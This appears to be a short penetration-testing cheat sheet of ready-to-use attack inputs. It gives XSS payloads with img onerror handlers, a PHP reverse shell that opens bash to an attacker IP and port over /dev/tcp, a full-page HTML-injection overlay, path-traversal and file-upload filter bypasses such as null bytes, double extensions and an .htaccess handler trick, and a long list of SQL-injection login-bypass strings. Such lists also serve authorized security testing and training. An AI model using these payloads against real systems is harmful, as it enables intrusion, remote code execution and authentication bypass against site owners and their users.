# XSS easy payload

%3Cimg%20src%3D0%20onerror%3D%27alert(00)%27%2F%3E
<img src=0 onerror='alert(00)'/>
<IMG SRC= onmouseover="alert('xxs')">

text with print: <img src=1 onerror=print()>

<img src=0 onerror='alert`1`'/>

# Reverse shells

<?php
exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<Port> 0>&1’”)
?>

# HTML Injection
<a href="https://wallsec.de" style="display: block; z-index: 100000; opacity: 0.5; position: fixed; top:blue 0px; left: 0; width: 1000000px; height: 100000px; background-color: green;"> Normal Text </a> 

%3Ca%20href%3D%22https%3A%2F%2Fwallsec%2Ede%22%20style%3D%22display%3A%20block%3B%20z%2Dindex%3A%20100000%3B%20opacity%3A%200%2E5%3B%20position%3A%20fixed%3B%20top%3Ablue%200px%3B%20left%3A%200%3B%20width%3A%201000000px%3B%20height%3A%20100000px%3B%20background%2Dcolor%3A%20green%3B%22%3E%20%3C%2Fa%3E%20%0A"  

# trasversal and fileupload

trasversal: /../../../../
trasversal: filename=../datei.php / ..%2fdatei.php
content-type= type/type

Read: AddType application/x-httpd-php .l33t / .htaccess

Null terminator= %00

Double extension: datei.php.jpg
Trailing: exploit.php.
URL encoding: exploit%2Ephp
semicolon: exploit.asp;.jpg or exploit.asp%00.jp
recursiv: exploit.p.phphp


# SQL login
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x

')) or true--
')) or ((''))=(('
')) or 1--
')) or (('x'))=(('

')) or true--
')) or ((''))=(('
')) or 1--
')) or (('x'))=(('

" or true--
" or ""="
" or 1--
" or "x"="

') or true--
') or ('')=('
') or 1--
') or ('x')=('
